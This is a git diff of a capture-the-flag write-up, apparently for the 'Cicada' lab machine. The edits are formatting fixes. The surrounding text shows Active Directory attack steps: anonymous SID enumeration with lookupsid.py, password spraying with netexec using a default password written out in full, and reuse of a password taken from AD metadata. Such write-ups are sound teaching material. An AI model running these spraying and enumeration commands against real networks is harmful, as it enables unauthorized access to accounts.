@@ -27,14 +27,13 @@ Seen in the previous task, from listing the contents of the HR share, the file n
 
 Which user account is still using the company default password?
 
-To see the contents of the file found, we can transfer it to the host by running ``get "Notice from HR.txt". Opening it, we see a welcoming message to a new hire with the default password but it does not give a username
+To see the contents of the file found, we can transfer it to the host by running ``get "Notice from HR``.txt". Opening it, we see a welcoming message to a new hire with the default password but it does not give a username
 
 ![alt text](image-ci-3.png)
 
 Then, we can try to enumerate domain users on the target IP and save them to a file by running ``lookupsid.py anonymous@<target_ip> > lookupsid_output.txt``. Then, we save the usernames cleanly we run ``grep '(SidTypeUser)' lookupsid_output.txt | awk -F '\\' '{print $2}' | cut -d' ' -f1 > users.txt``.  Finally using the password found in the file, we can perform a password spray attack by running ``netexec smb <target_ip> -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'`` and find the username to be michael.wrightson.
 
 ![alt text](image-ci-5.png)
-
 ### Task 4
 
 Which user has left their password in Active Directory metadata?
@@ -43,11 +42,11 @@ We dump the AD metadata using ``ldapdomaindump -u cicada.htb\\michael.wrightson 
 
 ![alt text](image-ci-6.png)
 
-After finding the password we can try to connect with it using the users.txt file from the previous task as ``netexec smb <target_ip> -u users.txt -p 'aRt$Lp#7t*VQ!3'``. 
+After finding the password we can try to connect with it using the users.txt file from the previous task as ``netexec smb <target_ip> -u users.txt -p 'aRt$Lp#7t*VQ!3'``.
 
 ![alt text](image-ci-7.png)
 
-`<!-- truncate -->`
+<!--truncate--> 
 
 ### Task 5
 
